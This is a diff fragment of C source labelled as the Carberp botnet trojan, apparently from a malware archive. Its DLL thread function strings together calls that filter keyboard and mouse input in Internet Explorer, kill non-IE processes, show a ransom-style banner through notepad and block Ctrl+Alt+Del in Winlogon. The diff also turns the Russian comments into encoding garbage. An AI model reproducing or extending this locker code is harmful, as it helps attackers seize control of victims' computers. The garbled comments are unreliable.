@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <time.h>
 #include <stdio.h>
@@ -97,22 +108,22 @@ unsigned __stdcall DllMainStartThread(void* p)
 {
   PP_DPRINTF(L"LokerDll:DllMainStartThread: started.");
 
-  // Пробуем запустить IE часть
-  //  - фильтрация клавищ Alt Ctrl и правой кнопки мыши
+  // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ IE пїЅпїЅпїЅпїЅпїЅ
+  //  - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Alt Ctrl пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
   TryInitIEFiltering();
   
-  // Пробуем запустить Explorer часть:
-  // - убивание всего, что не IE
-  // - запуск notepad для показа банера
+  // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Explorer пїЅпїЅпїЅпїЅпїЅ:
+  // - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅ IE
+  // - пїЅпїЅпїЅпїЅпїЅпїЅ notepad пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
   TryInitNonIEKilling();
   TryInitNotepadStart();
 
-  // Пробуем запустить Notepad часть:
-  // - просмотр банера
+  // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Notepad пїЅпїЅпїЅпїЅпїЅ:
+  // - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
   TryInitBannerShowing();
 
-  // Пробуем запустить Winlogon часть:
-  // - блокировка CtrlAltDel
+  // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Winlogon пїЅпїЅпїЅпїЅпїЅ:
+  // - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ CtrlAltDel
   TryInitWinlogonFiltering();
 
   _endthreadex(0);
@@ -120,7 +131,7 @@ unsigned __stdcall DllMainStartThread(void* p)
 }
 
 
-/// При загрузке библиотеки извлекается из ресурсов список урлов
+/// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved)
 {
   WCHAR path[MAX_PATH];
